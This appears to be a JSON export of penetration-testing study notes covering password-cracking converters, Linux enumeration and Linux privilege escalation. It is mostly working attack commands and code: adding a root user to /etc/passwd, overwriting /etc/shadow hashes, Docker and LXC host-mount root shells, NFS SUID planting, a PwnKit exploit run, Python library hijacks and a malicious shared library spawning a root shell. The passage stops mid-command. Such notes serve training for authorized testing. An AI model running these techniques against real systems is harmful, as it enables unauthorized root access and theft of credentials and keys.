Converts TrueCrypt volumes for John. |\n| `keepass2john <file>.kdbx > <file>.hash` | Converts KeePass databases for John. |\n| `vncpcap2john <file>.pcap > <file>.hash` | Converts VNC PCAP files for John. |\n| `putty2john <file>.log > <file>.hash` | Converts PuTTY private keys for John. |\n| `zip2john <file>.zip > <file>.hash` | Converts ZIP archives for John. |\n| `hccap2john <file>.hccapx > <file>.hash` | Converts WPA/WPA2 handshake captures for John. |\n| `office2john <file>.docx > <file>.hashoffice2john <file>.xlsx > <file>.hash` | Converts MS Office documents for John. |\n| `wpa2john <file>.cap > <file>.hash` | Converts WPA/WPA2 handshakes for John. |\n| `bitlocker2john -i <file>.vhd > <file>.hash` | Converts VHD file for John. |\n| `locate *2john* | grep <format>` | Check to see if there is a converter tool installed. |",
    "headings": [
      {
        "level": 1,
        "text": "Cracking Passwords"
      },
      {
        "level": 1,
        "text": "Hashcat"
      },
      {
        "level": 1,
        "text": "John The Ripper"
      },
      {
        "level": 2,
        "text": "John the Ripper Conversions"
      }
    ],
    "commands": [],
    "tags": [
      "hashcat",
      "rce",
      "sudo"
    ],
    "size": 2264,
    "lineCount": 42
  },
  {
    "id": "cpts-playbook-exploitation-2e0f5174ff0280a09433d47553ba4a3d",
    "title": "Exploitation",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook",
    "filePath": "CPTS Playbook/Exploitation 2e0f5174ff0280a09433d47553ba4a3d.md",
    "content": "# Exploitation\n\n[Common Web Vulnerabilities](Exploitation/Common%20Web%20Vulnerabilities%202e0f5174ff0280b6863ecf83c3ecf491.md)\n\n[Common Web Exploitation](Exploitation/Common%20Web%20Exploitation%202e0f5174ff02808a84a0d4c7760e5428.md)\n\n[Active Directory Exploitation](Exploitation/Active%20Directory%20Exploitation%202e0f5174ff0280e6bb4ae466be69ebb9.md)",
    "headings": [
      {
        "level": 1,
        "text": "Exploitation"
      }
    ],
    "commands": [],
    "tags": [],
    "size": 353,
    "lineCount": 7
  },
  {
    "id": "cpts-playbook-information-gathering-2dff5174ff028060b36cc4011c1dbfb9",
    "title": "Information Gathering",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook",
    "filePath": "CPTS Playbook/Information Gathering 2dff5174ff028060b36cc4011c1dbfb9.md",
    "content": "# Information Gathering\n\n[Service Enumeration](Information%20Gathering/Service%20Enumeration%202e0f5174ff0280668218ef1fd863a33b.md)\n\n[Web Enumeration](Information%20Gathering/Web%20Enumeration%202e0f5174ff02807fa7c5f0e4145cc961.md)\n\n[Active Directory Enumeration](Information%20Gathering/Active%20Directory%20Enumeration%202dff5174ff02800a818fd9dfc9ad5972.md)",
    "headings": [
      {
        "level": 1,
        "text": "Information Gathering"
      }
    ],
    "commands": [],
    "tags": [],
    "size": 359,
    "lineCount": 7
  },
  {
    "id": "cpts-playbook-lateral-movement-2edf5174ff0280f39eacc37802c04865",
    "title": "Lateral Movement",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook",
    "filePath": "CPTS Playbook/Lateral Movement 2edf5174ff0280f39eacc37802c04865.md",
    "content": "# Lateral Movement\n\n[Windows Lateral Movement](Lateral%20Movement/Windows%20Lateral%20Movement%202edf5174ff0280349569f916a8151f23.md)\n\n[Pivoting](Lateral%20Movement/Pivoting%202edf5174ff02800d845afc455baba241.md)\n\n[Tunneling](Lateral%20Movement/Tunneling%202f0f5174ff0280a69fbafcd07564a0ae.md)",
    "headings": [
      {
        "level": 1,
        "text": "Lateral Movement"
      }
    ],
    "commands": [],
    "tags": [
      "lateral movement"
    ],
    "size": 293,
    "lineCount": 7
  },
  {
    "id": "cpts-playbook-post-exploitation-linux-2e0f5174ff02806ab747d98451cfe2ee",
    "title": "Linux",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation",
    "filePath": "CPTS Playbook/Post Exploitation/Linux 2e0f5174ff02806ab747d98451cfe2ee.md",
    "content": "# Linux\n\n[Linux Enumeration](Linux/Linux%20Enumeration%202e0f5174ff0280f0bd08ee729d8dec3e.md)\n\n[Linux PrivEsc](Linux/Linux%20PrivEsc%202e0f5174ff0280a0b3f0e4766e65120f.md)",
    "headings": [
      {
        "level": 1,
        "text": "Linux"
      }
    ],
    "commands": [],
    "tags": [
      "privesc"
    ],
    "size": 171,
    "lineCount": 5
  },
  {
    "id": "cpts-playbook-post-exploitation-linux-linux-enumeration-2e0f5174ff0280f0bd08ee729d8dec3e",
    "title": "Linux Enumeration",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Linux",
    "filePath": "CPTS Playbook/Post Exploitation/Linux/Linux Enumeration 2e0f5174ff0280f0bd08ee729d8dec3e.md",
    "content": "# Linux Enumeration\n\n# **Users & Groups**\n\n| **Action** | **Description** |\n| --- | --- |\n| `cat /etc/passwd`\n\nOnly usernames:`cut -d: -f1 /etc/passwd`\n\nOnly username and home directories of users with shells: `awk -F: '($7 !~ /(false|nologin)$/) { print $1, $6 }' /etc/passwd` | Lists all user accounts.Make sure to check whether there are password hashes in `/etc/passwd`. |\n| Lists all groups: `cat /etc/group`\n\nOnly group with members: `awk -F: 'NF == 4 && $4 != \"\" { print }' /etc/group` | Lists all groups and its members. |\n| `id` | Displays the name, UID and GID of the current user, alongside its group memberships. |\n| `env` | Displays all shell environment variables. |\n| `whowfinger` | Lists currently logged in users. |\n| `lastlog` | Lists when was the last time each user logged in.Users who never logged in are less likely targets. |\n\n# **Operating System & Architecture**\n\n| **Action** | **Description** |\n| --- | --- |\n| `hostname` | Displays hostname of system. This may hint at the purpose of the host. |\n| Linux distro: `cat /etc/issuecat /etc/*-release`\n\nKernel version: `(cat /proc/version || uname -a ) 2>/dev/null` | Displays the Linux distribution and kernel version. |\n| `arch` | Displays the CPU architecture. |\n| `realm list` | Check if Linux host is Active Directory domain-joined. \nIf it is, this command will output a bunch of information. \nPay attention to the fields: `domain-name`- `permitted-logins`- `permitted-groups`- `configured` (if it’s `kerberos-member`, PtH is possible) |\n| `ps -ef | grep -i \"winbind|sssd\"` | If the realms command does not exist, try to footprint by searching for AD tools such as `winbind` and `sssd`. |\n\n# **Network**\n\n| **Action** | **Description** |\n| --- | --- |\n| `ip a` | Displays all network interface configurations, including IP addresses and subnet masks. |\n| `ss -tunap | awk 'NR==1 || /ESTAB|LISTEN/'` | Displays active network connections and their associated PID.\n`ESTAB`: Actively connected and exchanging data.\n`LISTEN`: Waiting for someone to connect. |\n| Gateway: `ip route`\nDNS: `cat /etc/resolv.conf` | Enumerates the default gateway and DNS server. |\n| `cat /etc/hosts` | Displays the local host-to-IP address mappings on the system. |\n| `arp -a` | Displays the system’s ARP cache. Useful for identifying nearby or potentially new hosts. |\n\n# **File System**\n\n| **Action** | **Description** |\n| --- | --- |\n| `ls -la /opt /var/backups /var/opt /var/mail /tmp /var/tmp` | Check the contents of directories that often contains interesting files. |\n| `find / -writable -type d 2>/dev/null` | Finds writable directories by the current user. |\n| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;` | Finds files with capabilities set in common system binary directories. |\n\n# **Programs**\n\n ****\n\n| **Action** | **Description** |\n| --- | --- |\n| `which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null` | Checks whether a bunch of useful programs are present on the system. |\n\n# **Processes & Services**\n\n| **Action** | **Description** |\n| --- | --- |\n| `./nmap -T4 -v 127.0.0.1` | Using a static binary of Nmap (LINK), runs an internal scan for services. |\n| `ps aux`\n\nFilter processes by a particular user:\n`ps aux | grep <user>` | Lists system processes. \n\nUse pspy64 for better listting of running services. |\n\n# **Security**\n\n| **Action** | **Description** |\n| --- | --- |\n| If the Debian `iptables-persistent`  package as used: \n`cat /etc/iptables/rules.v4` | By default, we usually need `root` access to see the Firewall setting for a system.\n\nHowever, under some circumstances, we may be able to enumerate them as a low-privileged user. |",
    "headings": [
      {
        "level": 1,
        "text": "Linux Enumeration"
      },
      {
        "level": 1,
        "text": "Users & Groups"
      },
      {
        "level": 1,
        "text": "Operating System & Architecture"
      },
      {
        "level": 1,
        "text": "Network"
      },
      {
        "level": 1,
        "text": "File System"
      },
      {
        "level": 1,
        "text": "Programs"
      },
      {
        "level": 1,
        "text": "Processes & Services"
      },
      {
        "level": 1,
        "text": "Security"
      }
    ],
    "commands": [],
    "tags": [
      "nmap",
      "kerberos",
      "sudo"
    ],
    "size": 3854,
    "lineCount": 82
  },
  {
    "id": "cpts-playbook-procedures-linux-enumeration-privesc-2f0f5174ff028091beb9f9da61577ffd",
    "title": "Linux Enumeration & PrivEsc",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Procedures",
    "filePath": "CPTS Playbook/Procedures/Linux Enumeration & PrivEsc 2f0f5174ff028091beb9f9da61577ffd.md",
    "content": "# Linux Enumeration & PrivEsc\n\n# **Enumeration**\n\n- Enumerate users and groups\n    - [ ]  List local users\n    - [ ]  List local groups\n    - [ ]  Currently logged on users\n    - [ ]  Last logins\n    - Check membership of interesting groups\n        - [ ]  `wheel`\n        - [ ]  `docker`\n        - [ ]  `shadow`\n        - [ ]  `lxc` and `lxd`\n        - [ ]  `disk`\n        - [ ]  `adm`\n- Enumerate operating system information\n    - [ ]  Linux distribution\n    - [ ]  Kernel Version\n    - [ ]  Architecture (32 or 64 bit)\n    - [ ]  Is it AD domain joined?\n- Enumerate network information\n    - [ ]  IP addresses and network interfaces\n    - [ ]  List active connections and listening ports\n- Enumerate program and processes information\n\n# **Privilege Escalation**\n\n# **Global**\n\n- [ ]  Identify the Linux distribution and Kernel version\n- [ ]  Check for credentials in web application configuration files\n- [ ]  Check interesting directories (e.g. `/opt`, `/var/mail`, etc.)\n- [ ]  Check capabilities\n- [ ]  Check if `sudo` version is vulnerable ([CVE-2023–22809](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809))\n- [ ]  Internal Nmap scan\n- [ ]  Check PwnKit\n- [ ]  Check LogRotate (versions 3.8.8, 3.11.0, 3.15. and 3.18.0)\n- [ ]  Monitor processes. Look for anything interesting.\n- [ ]  Look for writable Docker socket files.\n- [ ]  Look for Tmux sessions that can be hijacked\n- [ ]  Check for NFS shares with `no_root_squash` enabled\n- [ ]  Check kernel exploits (e.g. DirtyCow, DirtyPipe)\n- [ ]  Listen to traffic using TcpDump. Any cleartext credential?\n\n# **Per User**\n\n- [ ]  Check which groups user belongs to\n- [ ]  Check `sudo` rights\n- [ ]  Check for environment variables\n- [ ]  Look for ssh keys on home directory\n- [ ]  Check for hidden files in home directory\n- [ ]  Check history files on home directory\n- [ ]  Hunt for interesting files\n- [ ]  Enumerate SUID / GUID binaries\n- Check for exploitable cronjobs:\n    - [ ]  System-wide cronjobs\n    - [ ]  User-specific cronjobs\n    - [ ]  Monitor processes for regularly repeating commands, suggesting a hidden cron job.\n- [ ]  Try to read other user’s home directory (`.ssh/id_rsa`, `.bash_history`, etc.)\n- [ ]  Try using user’s password for other users\n- [ ]  Run `linpeas.sh`",
    "headings": [
      {
        "level": 1,
        "text": "Linux Enumeration & PrivEsc"
      },
      {
        "level": 1,
        "text": "Enumeration"
      },
      {
        "level": 1,
        "text": "Privilege Escalation"
      },
      {
        "level": 1,
        "text": "Global"
      },
      {
        "level": 1,
        "text": "Per User"
      }
    ],
    "commands": [],
    "tags": [
      "nmap",
      "linpeas",
      "privesc",
      "sudo",
      "suid"
    ],
    "size": 2277,
    "lineCount": 62
  },
  {
    "id": "cpts-playbook-post-exploitation-linux-linux-privesc-2e0f5174ff0280a0b3f0e4766e65120f",
    "title": "Linux PrivEsc",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Post Exploitation / Linux",
    "filePath": "CPTS Playbook/Post Exploitation/Linux/Linux PrivEsc 2e0f5174ff0280a0b3f0e4766e65120f.md",
    "content": "# Linux PrivEsc\n\n# Passwd & Shadow\n\n- **Readable /etc/shadow**\n    \n    \n    | **Action** | **Description** |\n    | --- | --- |\n    | On the attack machine, after exfiltrating the files:`unshadow <passwd> <shadow> > <unshadow-file>.hashes` | We need both `/etc/passwd` and `/etc/shadow` to unshadow the hashes.`/etc/passwd` provides the usernames, while `/etc/shadow` contains the corresponding password hashes. |\n    | `hashcat -m <mode> -a 0 <unshadow-file> <wordlist>` | Cracks password using hashcat and wordlist. |\n- **Writeable /etc/passwd**\n    \n    Mistakes in editing `/etc/passwd` can corrupt the file and render the system unusable.\n    \n    | **Action** | **Description** |\n    | --- | --- |\n    | `openssl passwd <new-passwd>` | Generates a password hash in the format used by `/etc/passwd`. |\n    | – | Removing the `x` from a user’s password field disables password-based authentication for that user. |\n    | `echo 'r00t:<password-hash>:0:0:root:/root:/bin/bash' >> /etc/passwd` | Creates a new `root` user with a known password hash. |\n- **Writeable /etc/shadow**\n    \n    \n    | **Command** | **Description** |\n    | --- | --- |\n    | `mkpasswd -m sha-512 <password>` | Generate a SHA-512 hash for a chosen password. |\n    | `sed -i 's/^<username>:\\(.*\\):/<username>:<password-hash>:/' /etc/shadow` | Replace a user’s password hash with your own. |\n    | – | Copy root’s line, rename the user, and set your own password hash. |\n\n# **Capability Abuse**\n\n### Enumerating Capabilities\n\n| **Command** | **Description** |\n| --- | --- |\n| `getcap -r / 2>/dev/null | grep -E 'cap_dac_read_search|cap_dac_override|cap_chown|cap_fowner|cap_setuid|cap_setgid'`\n\nFind the full path for `getcap`:\n`find / -iname getcap 2>/dev/null` | Lists all binaries with capabilities that are potentially dangerous.We are looking for:- `cap_dac_read_search`- `cap_dac_override`- `cap_chown`- `cap_fowner`- `cap_setuid`- `cap_setgid` |\n| `./linpeas.sh` | [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) automatically scans for binaries with capabilities, highlighting those that are known to be exploitable. |\n\n### Abusing Capabilities\n\n| **Command** | **Description** |\n| --- | --- |\n| Check if the binary can read files:[https://gtfobins.github.io/#+file%20read](https://gtfobins.github.io/#+file%20read) | (`cap_dac_read_search`) Grants the ability to read any file on the system, including those owned by `root`.\n\nThis rarely provides direct root access but can be leveraged to read sensitive files such as config files, private SSH keys, or `/etc/shadow` to escalate privileges. |\n| Check if the binary can write to files:[https://gtfobins.github.io/#+file%20write](https://gtfobins.github.io/#+file%20write) | (`cap_dac_override`) Enables writing to any file regardless of ownership or permissions.\n\nIf assigned to binaries like text editors or scripting interpreters, this creates a privilege escalation opportunity.\n\nPotential payloads include: Inserting a root user entry into `/etc/passwd`- Modifying `/etc/shadow` to change passwords- Adding your user to the `sudoers` file |\n| Check if the binary can be used to execute arbitrary commands:[https://gtfobins.github.io/#+shell](https://gtfobins.github.io/#+shell)\n\nIt’s good practice to restore ownership of the file after escalating privileges. | (`cap_chown`) Allows changing ownership of any file.\n\nThis capability enables indirect write access by taking ownership, modifying a file, and reverting ownership.\n\nIf the binary permits arbitrary command execution, this can be exploited for privilege escalation by manipulating critical files while maintaining cover. |\n| Check if the binary can be used to execute arbitrary commands:[https://gtfobins.github.io/#+shell](https://gtfobins.github.io/#+shell)\n\nYou change the enable the SUID bit on `/bin/bash` or other shells to make it run as `root`. | (`cap_fowner`) Permits changing file ownership and modifying file flags, including the SUID bit.\n\nThis allows escalation by making a binary execute with elevated privileges.\n\nIf arbitrary command execution is available, this creates a direct privilege escalation path by setting SUID on a controlled binary. |\n| Check if the binary is exploitable:[https://gtfobins.github.io/#+capabilities](https://gtfobins.github.io/#+capabilities) | (`cap_setuid`) Enables execution of the binary with this capability as `root`.\n\nIf the binary with this capability allows arbitrary command execution, it can be exploited for direct root privilege escalation. |\n| Check if the binary is exploitable:[https://gtfobins.github.io/#+capabilities](https://gtfobins.github.io/#+capabilities)\n\nNote: Assigning the `setgid` to the `shadow` group (GID `42`) instead of `root` (GID `0`) can grant read access to `/etc/shadow`, which is a more strategic approach for escalation than setting `root` group permissions. | (`cap_setgid`) Enables execution of the binary with this capability with an elevated group ID.\n\nThis is less powerful than `cap_setuid` since it mainly provides elevated read access.\n\nPrivilege escalation is possible if arbitrary command execution is available. |\n\n# **Cron Job Exploitation**\n\n### Enumerating Cron Job\n\n| **Action** | **Description** |\n| --- | --- |\n| `ps -efw | grep -i \"cron\"` | Verify that the `crond` daemon is running. |\n| `grep -H -v \"^#\" /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/* /var/spool/cron/crontabs/* /var/spool/cron/crontabs/root 2>/dev/null` | Enumerates system-wide cronjobs by looking for crontab files in standard locations. |\n| `cat /var/log/syslog /var/log/cron.log　| grep \"CRON\"` | If we can access certain key log files, we might be able to identify user-specific cron jobs that would otherwise remain hidden.These log files are generally only accessible to `root` and users belonging to the `adm` group. |\n| `./pspy64`\n\nIf we are in a unstable shell, we may want to run the command on a timer:`timeout <time-in-seconds> ./pspy64` | By using [pspy](https://github.com/DominicBreuker/pspy), we can observe processes being executed at regular intervals, indicating the presence of recurring tasks.This behavior often points to a hidden cron job owned by another user, one that can’t be directly identified by inspecting crontab files. |\n\nCrontab files are located in different places based on their type:\n\n- **User-specific crontabs**: Usually stored in `/var/spool/cron`, each file corresponds to a user account.\n- **System-wide crontabs**: Defined in `/etc/crontab` and in files within the `/etc/cron.d/` directory, typically managed by the system or packages.\n\n# **NFS no_root_squash**\n\n| **Action** | **Description** |\n| --- | --- |\n| `cat /etc/exports | grep no_root_squash` | Identify directories where `no_root_squash` is enabled, as these are susceptible to this type of privilege escalation attack. |\n| `mkdir /tmp/privesc\n\nsudomount -t nfs <victim-ip>:<shared_directory> /tmp/privesc` | From the attacker’s machine, mount the vulnerable NFS export to a local directory. |\n| Place a malicious binary and set it as owned by root with the SUID bit:`sudo chown root:root /tmp/privesc/<malicious-binary>\n\nsudo chmod a+xs /tmp/privesc/<malicious-binary>` | Upload a binary owned by `root` with the SUID flag set, so that when executed, it triggers a malicious payload.Then, on the victim machine, execute the binary as the unprivileged user to run the payload with elevated rights. |\n\n# **PATH Hijacking**\n\n`PATH` hijacking is a vulnerability where an attacker exploits the system’s search order to execute unintended or malicious files instead of the intended ones.\n\nThis often occurs in scenarios such as SUID binaries and cronjobs that run programs without specifying their absolute paths.\n\n### SUID Binary Path Hijacking\n\n| **Command** | **Description** |\n| --- | --- |\n| `find / -iname <binary> 2>/dev/null` | If a cron job executes binaries without specifying an absolute path, it may be hijackable.First, identify where the binary in question is on the filesystem. |\n| `cat <crontab-file> | grep 'PATH'` | Check if the crontab file defines a custom `PATH` variable.If not, the system uses a default `PATH`, which typically reduces the risk of exploitation. |\n| `ls -la <directory>` | Verify the permissions of each directory that appears earlier (i.e., to the left) in the search order than the directory containing the binary.If we have write access to any of these directories, we can potentially hijack the binary. |\n| Wait for the cron job to run. | Place a malicious `elf` executable in the writable directory with the same name as the one used by the cron job, crafted to trigger your payload. |\n\n### Cronjob Path Hijacking\n\n| **Command** | **Description** |\n| --- | --- |\n| `find / -iname <binary> 2>/dev/null` | If a cron job executes binaries without specifying an absolute path, it may be hijackable.First, identify where the binary in question is on the filesystem. |\n| `cat <crontab-file> | grep 'PATH'` | Check if the crontab file defines a custom `PATH` variable.If not, the system uses a default `PATH`, which typically reduces the risk of exploitation. |\n| `ls -la <directory>` | Verify the permissions of each directory that appears earlier (i.e., to the left) in the search order than the directory containing the binary.If we have write access to any of these directories, we can potentially hijack the binary. |\n| Wait for the cron job to run. | Place a malicious `elf` executable in the writable directory with the same name as the one used by the cron job, crafted to trigger your payload. |\n\n# Privileged Groups\n\n## Adm Group\n\nThe `adm` group on Linux is typically used to grant read access to system logs, allowing its members to view all log files in the `/var/log` directory without needing full `root` privileges.\n\nThis doesn’t grant `root` access directly but can be used to gather sensitive information from log files, such as user credentials and running cron jobs.\n\n| **Action** | **Description** |\n| --- | --- |\n| `find /var/log/ -type f -readable` | Finds all files in `/var/log/` that the current user can read. |\n| `grep -Ri <string> /var/log` | Finds all occurrences of the a particular string (case-insensitive) within files under `/var/log/`.Searching for specific strings helps uncover accidentally logged sensitive information. Examples:• `password`• `token`• `secret`• `Authorization:`• `key` |\n| `aureport --tty` | Finds and displays audit records related to TTY (terminal) events, such as user logins and commands entered via the terminal, as logged by the audit subsystem.Sometimes users mistype commands and accidentally leak passwords or sensitive information directly into the terminal. |\n\n## **Disk Group**\n\nThe `disk` group on Linux grants its members access to raw disk devices, allowing them to read arbitrary data directly from filesystem.\n\nThis can be leveraged for privilege escalation by accessing sensitive information.\n\n| **Action** | **Description** |\n| --- | --- |\n| `df -h` | Displays mounted filesystems and their usage.Use this to identify which device the root (`/`) filesystem is mounted on. |\n| `debugfs /dev/<partition>` | Launches a filesystem debugging tool on the target partition.When used on the root partition, it provides a shell with `root`-level file read permissions. |\n| `cat /root/.ssh/id_rsacat /etc/shadow` | Some ideas on how to leverage this include reading SSH keys or `/etc/shadow` and attempting to crack hashes. |\n\n## **Docker Group**\n\nThe `docker` group on Linux grants permission to control the Docker daemon, which can be exploited to spawn containers with full `root` access on the host, effectively bypassing user restrictions.\n\n> If an attempt to get a shell on the container doesn’t work, try a different shell (`/bin/bash`, `/bin/sh`, `/bin/zsh`, etc.).\n> \n\n### Mount Abuse on Docker group\n\n| **Action** | **Description** |\n| --- | --- |\n| `docker images` | Lists available Docker images. Any image can be used to launch a container for exploitation. |\n| `docker run -it --rm -v /:/mnt <image_alias> chroot /mnt sh` | Mounts the host’s root filesystem into the container and starts a shell in a `chroot` environment, effectively granting `root` access to the host system. |\n| [Linux PrivEsc Payloads](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-privesc-payloads/) | From this point, execute any privilege escalation technique that involves modifying files, such as adding a root user to `/etc/passwd` or modifying `/etc/sudoers` to give our user super user capabilities. |\n\n### Writable Sock on Docker Group\n\n \n\n| **Action** | **Description** |\n| --- | --- |\n| `ls -la /var/run/docker.sock` | Checks if the Docker socket exists and if you have write access.\n\nA writable socket enables full control over Docker.\n\nNormally, Docker socket files are only writeable to `root` and members of the `docker` group, but misconfigurations happens. |\n| `docker images` | Lists available Docker images to use for exploitation. |\n| `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <image_alias> chroot /mnt bash` | Launches a container with the host’s root filesystem mounted and opens a `chroot` shell, effectively granting root access. |\n| [Linux PrivEsc Payloads](https://field-manual.brunorochamoura.com/manual/post-exploitation/linux-post-exploitation/linux-privilege-escalation/linux-privesc-payloads/) | From this point, execute any privilege escalation technique that involves modifying files, such as adding a root user to `/etc/passwd` or modifying `/etc/sudoers` to give our user super user capabilities. |\n\n## **LXC / LXD Group**\n\n| **Action** | **Description** |\n| --- | --- |\n| Import image:`lxc image import <image-file> --alias <alias>`\n\nVerify the image was imported:`lxc image list` | To use this method, we need a LXD image.\n\nIf an image file is already on the target (typically a `tar.gz`), we can import it directly.\n\nOtherwise, we may need to build one ourselves, such as using [Alpine Linux](https://github.com/saghul/lxd-alpine-builder), and transfer it to the target. |\n| Initialize an image without isolation and assign a container name:`lxc init <alias> <container-name> -c security.privileged=true`\n\nAllow access to the host filesystem:`lxc config device add <container-name> host-root disk source=/ path=/mnt/root recursive=true` | Next, we create a container from the image and configure it to bypass isolation mechanisms that normally restrict access to the host filesystem.\n\nThis mounts the host’s root filesystem to `/mnt` inside the container. |\n| `lxc start <container-name>lxc exec <container-name> /bin/bash`\n\n(If this doesn’t work, try other shells like `/bin/sh`) | Once the container is set up, we start it and open an interactive shell inside. |\n| `cd /mnt/` | Inside the container, navigating to `/mnt` gives us access to the host’s filesystem with root privileges.\n\nFrom here, we can proceed with a chosen privilege escalation payload. |\n\n# PwnKit\n\nThe PwnKit vulnerability ([CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034)) is a critical local privilege escalation flaw in the `pkexec` component of Polkit, which allows unprivileged users to gain root access on most major Linux distributions.\n\nBelow are tables listing the affected versions and their respective patched releases for popular Ubuntu and Debian distributions:\n\n| **Ubuntu version** | **Latest vulnerable version** | **First fixed version** |\n| --- | --- | --- |\n| 14.04 LTS (Trusty) | `0.105-4ubuntu3.14.04.6` | `0.105-4ubuntu3.14.04.6+esm1` |\n| 16.04 LTS (Xenial) | `0.105-14.1ubuntu0.5` | `0.105-14.1ubuntu0.5+esm1` |\n| 18.04 LTS (Bionic) | `0.105-20` | `0.105-20ubuntu0.18.04.6` |\n| 20.04 LTS (Focal) | `0.105-26ubuntu1.1` | `0.105-26ubuntu1.2` |\n\n| **Debian version** | **Latest vulnerable version** | **First fixed version** |\n| --- | --- | --- |\n| Stretch | `0.105-18+deb9u1` | `0.105-18+deb9u2` |\n| Buster | `0.105-25` | `0.105-25+deb10u1` |\n| Bullseye | `0.105-31` | `0.105-31+deb11u1` |\n| (unstable) | `0.105-31.1~deb12u1` | `0.105-31.1` |\n\n| **Action** | **Description** |\n| --- | --- |\n| Check OS version:`cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='`\n\nCheck Polkit version:`dpkg -s policykit-1 | grep 'Version:'` | Verify the OS and Polkit versions to determine if the system is vulnerable by comparing them with the tables below. |\n| Compile and run exploit:`cd CVE-2021-4034gcc cve-2021-4034-poc.c -o poc./poc` | Run this [proof-of-concept exploit](https://github.com/arthepsy/CVE-2021-4034) on the target to get root access. |\n\n# **Python Library Hijacking**\n\n## Write Permission\n\n| **Command** | **Description** |\n| --- | --- |\n| If it’s a Python script:`cat <script>.py`\n\nIf it’s a binary with an embedded Python interpreter:`strings <binary>` | If a script or binary imports a library that we have write access to, we can tamper with it to inject a payload.\n\nFirst, we need to:\n1. Identify the libraries being imported in the program.\n2. Note the specific library and functions being called. |\n| `python3 -c 'import os; import <library>;print(os.path.dirname(<library>.__file__))'` | After identifying the libraries being imported, the next step is to determine their exact locations in the filesystem. |\n| `grep -rlw \"def <function-name>\" <library-path>/* | xargs ls -l` | After identifying the library path, the next step is to locate the file(s) where the function is defined and check whether we have write permissions to those files. |\n| `...def <function-name>():\nimport os\nos.system('<payload>')...` | If we have write access, we can simply replace the function definition with one that executes our payload. |\n\n## Library Path\n\n| **Command** | **Description** |\n| --- | --- |\n| If it’s a Python script:\n`cat <script>.py`\n\nIf it’s a binary with an embedded Python interpreter:\n`strings <binary>` | If a script or binary imports a library, we may be able to hijack it under the following conditions:\n1. The module that is imported by the script is located under one of the lower priority paths listed in the `PYTHONPATH` variable.\n2. We must have write permissions to one of the paths having a higher priority on the list.\n\nThe first step would be to look for imports in the script and write down the library and the functions called. |\n| `python3 -c 'import os; import <library>;print(os.path.dirname(<library>.__file__))'` | After identifying the libraries being imported, the next step is to determine their exact locations in the filesystem. |\n| Lists the directories in the path:\n`python3 -c 'import sys; print(\"\\n\".join(sys.path))'`\n\nVerify write permissions on each directory:\n`ls -la <directory>` | After identifying the library path, the next step is to examine the directories listed in the `PYTHONPATH` environment variable (where directories to the left have higher priority) to determine:\n1. Whether there are directories with higher priority than the library’s location.\n2. If we have write permissions on any of these higher-priority directories.\n3. If any of these directories don’t exist, whether we have the ability to create them. |\n| `#!/usr/bin/env python3\nimport os\n\ndef <function-name>():\nos.system('<payload>')` | If we can write to or create a directory with higher priority than where the library is located, we can hijack it by creating a fake module.\n\nCreate a file named `<module>.py` that runs the payload inside the function.\n\nCheck the shebang line and match it to the original file to ensure it works correctly. |\n\n## PYTHONPATH\n\n| **Command** | **Description** |\n| --- | --- |\n| `sudo -l`\n\nExample of vulnerable right:\n`(ALL) SETENV: NOPASSWD: /usr/bin/python3 <script>.py` | If we have `sudo` permissions to execute a Python interpreter (even if to just execute a particular file) and the `SETENV` flag, we can tamper with the `PYTHONPATH` environment variable, potentially leading to a privilege escalation vector. |\n| If it’s a Python script:`cat <script>.py`\n\nIf it’s a binary with an embedded Python interpreter:`strings <binary>` | If the script imports a library, we may be able to hijack it by creating a fake library in a directory where we have write permissions and modifying the `PYTHONPATH` variable to prioritize that directory, ensuring our malicious library is loaded instead of the original.\nFirst, identify the imports in the script and note the libraries and functions being called. |\n| `#!/usr/bin/env python3\n\nimport os\ndef <function-name>():\nos.system('<payload>')` | Create a script named `<library>.py` in a directory you can write to (such as `/tmp`) and have it execute your payload within the function called by the script.\n\nBe sure to check the shebang line and match it to the original file to ensure compatibility. |\n| `sudo PYTHONPATH=/tmp/ /usr/bin/python3 <script>.py` | Run the script with `sudo` while setting the `PYTHONPATH` environment variable to the directory containing your malicious library, causing your payload to be executed. |\n\n# **Shared Object Hijacking**\n\nShared Objects in Linux are dynamic libraries (`.so` files) that allow multiple programs to share reusable code, saving memory and making updates easier. They are similar to DLLs on Windows.\n\nShared Object hijacking is a vulnerability where an attacker tricks a program into loading a malicious shared library instead of the intended one.\n\nThis vulnerability can be exploited to escalate privileges if the targeted binary runs with higher permissions than the attacker, such as SUID binaries or cronjobs.\n\n### Create Malicious Library\n\nMalicious C program that executes a payload immediately upon library load:\n\n```c\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void run_on_load() {\n    setuid(0);\n    system(\"/bin/bash -p\");\n}\n```\n\nTo compile it into a shared object file:\n\n**`gcc <vulnerable-lib>.c -fPIC -shared -o <vulnerable-lib>.so`**\n\n| **Command** | **Description** |\n| --- | --- |\n| Runs and traces the program’s system calls, showing all loaded libraries with side effects:`strace <binary> 2>&1 | grep -v '/lib/\\|/usr/\\|/etc/' | grep -i '\\\\.so'`\n\nLists compile-time linked libraries without running the program or side effects:`ldd <binary` | First, identify which shared libraries the binary loads and where the corresponding `.so` files are located.\n\nThis can be done dynamically by running the binary for a complete view, though this may cause side effects, or statically, which is safer but might miss libraries loaded at runtime.\n\nPay attention on whether the library file was found or not (`Failed to load library)`. |\n| Reads library path metadata from the binary without executing it:`readelf -d <binary> | grep -i 